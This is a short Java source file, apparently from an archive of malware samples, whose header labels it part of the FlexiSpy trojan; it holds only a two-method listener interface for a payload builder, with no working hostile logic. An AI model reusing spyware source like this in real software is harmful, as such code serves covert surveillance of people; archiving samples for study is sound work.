/*
  name      FlexiSpy
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
package com.vvt.prot.databuilder;

public interface PayloadBuilderListener {

	public void onPayloadBuilderError(Exception e);
	public void onPayloadBuilderCompleted(PayloadBuilderResponse response);
}
